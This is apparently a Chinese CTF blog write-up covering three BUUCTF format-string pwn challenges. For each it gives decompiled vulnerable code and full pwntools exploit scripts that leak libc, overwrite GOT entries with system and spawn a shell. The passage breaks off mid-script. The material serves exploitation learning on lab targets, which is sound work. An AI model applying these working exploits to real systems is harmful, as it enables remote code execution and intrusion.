<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<ul>
<li>RELRO:部分开启,got表可写</li>
</ul>
<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">257</span>]; <span class="comment">// [esp+Fh] [ebp-239h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">300</span>]; <span class="comment">// [esp+110h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+23Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Hello,I am a computer Repeater updated.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So I&#x27;ll answer whatever you say!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="keyword">sizeof</span>(format));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="built_in">sprintf</span>(format, <span class="string">&quot;Repeater:%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what you input is really long!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>一个死循环,里面是格式化字符串,无后门函数,先泄露libc地址</li>
<li>泄露完了以后可以通过改got表,来getshell</li>
<li>因为printf函数调用了两次,不方便控制参数,这里选择在read读入字符串了以后,sprintf复制以后,把strlen改为system</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./axb_2019_fmt32&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>) <span class="comment"># 这个是buu给的libc</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27062</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;break printf&quot;)</span></span><br><span class="line"></span><br><span class="line">sprintf_got = elf.got[<span class="string">&#x27;sprintf&#x27;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> + p32(sprintf_got)+ <span class="string">&quot;%8$s&quot;</span> <span class="comment"># 先泄露libc,这里的&#x27;a&#x27;用来对齐</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;tell me:&quot;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Repeater:&quot;</span>)</span><br><span class="line">io.recv(<span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line">sprintf_recv = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = sprintf_recv - libc.symbols[<span class="string">&#x27;sprintf&#x27;</span>]</span><br><span class="line">system_libc = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;sprintf_recv =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sprintf_recv)))  </span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_libc =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_libc)))</span><br><span class="line"><span class="comment"># 可以用log来代替print这样明显一点</span></span><br><span class="line"></span><br><span class="line">system_low = system_libc &amp; <span class="number">0xffff</span>  <span class="comment"># 注意这里的位操作</span></span><br><span class="line">system_high = (system_libc&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27; + fmtstr_payload(8,&#123;sprintf_got:system_libc&#125;,write_size = &quot;byte&quot;, numbwritten = 0xa)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> + p32(strlen_got) + p32(strlen_got+<span class="number">2</span>)</span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(system_low - <span class="number">0x12</span>) + <span class="string">&#x27;c%8$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(system_high - system_low) + <span class="string">&#x27;c%9$hn&#x27;</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;tell me:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;tell me:&quot;</span>, <span class="string">&quot;;/bin/sh\x00&quot;</span>) <span class="comment"># 注意这里这个分号</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<ul>
<li>注意<ol>
<li>libc可以先把got写进去,通过<code>%x$s</code>读plt</li>
<li>自己写got的时候,注意%n是把前面输出的东西的长度一起算在里面的,这里第二段payload中,前面输出了<code>Repeater:</code>0x9,然后<code>a</code>0x1,然后两个<code>p32</code>0x8,一共是0x12所以str(system_low)需要减0x12</li>
<li>后面str(system_high - system_low)因为前面输出的就是system_low所以不需要其他操作,只要加上差值就行,而且,因为x32的libc在0xf7xxxxxx,所以高4位肯定比低4位大, 不需要用负数</li>
<li>也可以用<code>fmtstr()</code>pwntools的函数来快速构造,第一个参数是需要覆盖的位置在格式化字符串的位置,第二个参数是一个字典,key是需要改的值,value是改了以后的值,write_size是一次改几个字符,numbwritten是已经写入了的字节数,这里<code>Repeater:</code>+<code>a</code>共0xa</li>
<li>注意最后payload里面那个分号,因为有sprintf写入的时候就是”Repeater:/bin/sh”可以通过分号来让system进行两个操作:<code>system(&quot;Repeater:;/bin/sh&quot;)</code>虽然前面那个会报错但还是可以getshell</li>
</ol>
</li>
</ul>
<h3 id="axb-2019-fmt64"><a href="#axb-2019-fmt64" class="headerlink" title="axb_2019_fmt64"></a>axb_2019_fmt64</h3><blockquote>
<p>格式化字符串,修改got表,64位</p>
</blockquote>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">272</span>]; <span class="comment">// [rsp+10h] [rbp-250h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> format[<span class="number">312</span>]; <span class="comment">// [rsp+120h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+258h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Hello,I am a computer Repeater updated.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So I&#x27;ll answer whatever you say!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    alarm(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x101</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="number">0x12C</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">sprintf</span>(format, <span class="string">&quot;Repeater:%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what you input is really long!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./axb_2019_fmt64&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>) <span class="comment"># 注意这里arch改动了,原本没有的,上一题忘记打了</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    libc =ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.27.so&quot;</span>) <span class="comment"># 这里两个libc一个是本机的</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27200</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./buulibc/libc-2.23-x64.so&quot;</span>) <span class="comment"># 这个libc是靶机的</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sprintf_got = elf.got[<span class="string">&#x27;sprintf&#x27;</span>]</span><br><span class="line">strlen_got = elf.got[<span class="string">&#x27;strlen&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%9$s&quot;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p64(sprintf_got) <span class="comment"># 这里因为64位会有0截断字符串</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;tell me:&quot;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Repeater:&quot;</span>)</span><br><span class="line"></span><br><span class="line">sprintf_recv = u64(io.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>) </span><br><span class="line"></span><br><span class="line">libc_base = sprintf_recv - libc.symbols[<span class="string">&#x27;sprintf&#x27;</span>]</span><br><span class="line">system_libc = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;sprintf_recv =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(sprintf_recv)))</span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_libc =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_libc)))</span><br><span class="line"></span><br><span class="line">system_low = system_libc &amp; <span class="number">0xffff</span></span><br><span class="line">system_high = (system_libc&gt;&gt;<span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = fmtstr_payload(8,&#123;strlen_got:system_libc&#125;,write_size = &quot;byte&quot;, numbwritten = 0x9)</span></span><br><span class="line"><span class="comment"># 老样子可以用fmtstr_payload来构造,比较简单</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_fmtstr</span>(<span class="params">source_address, destination_address</span>):</span></span><br><span class="line">    write_size = <span class="number">0</span>  <span class="comment"># 这个是用来存储上一个字节,来比较是应该用正数还是负数,初始应该为0,不需要改</span></span><br><span class="line">    offset = <span class="number">13</span>  <span class="comment"># 这个是格式化字符串的位置,需要动调或者其他方法来确定,这里第一个是%13$hn</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">    n = <span class="number">3</span> <span class="comment"># 这个是循环次数,因为64位写的地址都是6字节,(最后两个字节是\x00),用hn一次改两个字节,所以是三次</span></span><br><span class="line">    bytewritten = <span class="number">0x9</span> <span class="comment"># 这个是已经写了的字符,这里因为sprintf的原因,有&quot;Repeater:&quot;0x9个字节</span></span><br><span class="line">    adjust = <span class="number">0x28</span> <span class="comment"># 这个是根据动调的时候,格式化字符串的长度调整的,为了让格式化字符串后面的source_address,在输入的时候对齐栈,这里3遍,每一次输入&quot;%xxxxxc%xxhn&quot; (输入的时候是十进制),12个字节,12*3 = 36 = 0x24,因此用0x28对齐</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        num = (destination_address &gt;&gt; (<span class="number">16</span>*i)) &amp; <span class="number">0xffff</span>  <span class="comment"># 先取当前需要更改的地址字节</span></span><br><span class="line">        num -= bytewritten <span class="comment"># 每一次都减掉已经写入的字符,上面32wei只减了一次是因为后面用的是原本的低地址,这里用write_size,这个write_size是包含减掉的字符的</span></span><br><span class="line">        <span class="keyword">if</span> num &gt; write_size &amp; <span class="number">0xffff</span>:</span><br><span class="line">            payload += <span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hn&#x27;</span>.<span class="built_in">format</span>(num - (write_size&amp;<span class="number">0xffff</span>), offset + i)</span><br><span class="line">            write_size += num - (write_size &amp; <span class="number">0xffff</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += <span class="string">&#x27;%&#123;&#125;c%&#123;&#125;$hn&#x27;</span>.<span class="built_in">format</span>((<span class="number">0x10000</span>-(write_size&amp;<span class="number">0xffff</span>))+num, offset + i)</span><br><span class="line">            write_size += <span class="number">0x10000</span> - (write_size&amp;<span class="number">0xffff</span>) + num</span><br><span class="line">    </span><br><span class="line">    payload = payload.ljust(adjust, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        payload += p64(source_address + i*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload = create_fmtstr(strlen_got, system_libc)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;tell me:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;tell me:&quot;</span>, <span class="string">&quot;;/bin/sh\x00&quot;</span>) <span class="comment"># 这里的分号同32位</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h4><ul>
<li><p>注意</p>
<ol>
<li><p>64位输入字符串的时候,64位的地址只有6位,剩下两位都是<code>\x00</code>,这样会截断字符串,在后面sprintf转递的时候,0后面的会被忽略,因此第一段payload相比32位的把格式化字符串写到了地址前面,让地址的<code>\x00</code>在后</p>
</li>
<li><p>可以用fmtstr_payload构造,比较简单,构造方法同32位,就是要先在最上面的context里面加上<code>arch = &#39;amd64&#39;</code>一项</p>
</li>
<li><p>和32位还有一点区别就是参数在栈上的位置,这里是已经对齐了,32位会需要通过补a调整,64位不知道是巧合还是自动对齐的</p>
</li>
<li><p>写了一个<code>create_fmtstr()</code>函数功能和<code>fmtstr_payload()</code>差不多,用来手打处理第二个字节比第一个字节大的问题(这样就没法再加一个数,来改字节),可以通过补码的处理,让它变成减一个数</p>
<ol>
<li><p>关于每次循环都要减去bytewritten:<br>$$<br>high-(low-bytewritten)-bytewritten=high-low<br>$$</p>
</li>
<li><p>关于负数的计算:</p>
<p>因为不管二进制还是十进制总归有<br>$$</p>
<pre><code>    &#123;正数+负数 = 0&#125;
</code></pre>
<p>$$<br>​       例:<br>$$<br>0001 + x = 0\</p>
<pre><code>    x = 1111\\
    0001 + 1111 = 10000
</code></pre>
<p>$$<br>​       这里的10000的1表示符号是负的,即<br>$$</p>
<pre><code>    0001 + x = 0\\
    x = 10000 - 0001
</code></pre>
<p>$$<br>​       这里<br>$$<br>有low&gt;high\</p>
<pre><code>    需要high-low\\
    转化为负数:10000-(high-low)\\
    = 10000-high+low
</code></pre>
<p>$$</p>
</li>
</ol>
</li>
</ol>
</li>
</ul>
<h3 id="wdb-2018-2nd-easyfmt"><a href="#wdb-2018-2nd-easyfmt" class="headerlink" title="wdb_2018_2nd_easyfmt"></a>wdb_2018_2nd_easyfmt</h3><blockquote>
<p>easyfmt 32位</p>
</blockquote>
<p>这一题和axb_2019_fmt32差不多,没啥好说的</p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>

<p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know repeater?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x64</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">file_path = <span class="string">&#x27;./wdb_2018_2nd_easyfmt&#x27;</span></span><br><span class="line">context(binary=file_path, os=<span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line"></span><br><span class="line">_debug_ = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> _debug_:</span><br><span class="line">    io = process(file_path)</span><br><span class="line">    libc =ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27894</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./buulibc/libc-2.23-x86.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">putchar_got = elf.got[<span class="string">&#x27;putchar&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = p32(read_got) + <span class="string">&quot;%6$s&quot;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;repeater?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.recv(<span class="number">4</span>)</span><br><span class="line">read_recv = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">libc_base = read_recv - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_libc = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;read_recv =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(read_recv)))</span><br><span class="line">log.success(<span class="string">&#x27;libc_base =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">log.success(<span class="string">&#x27;system_libc =&gt; 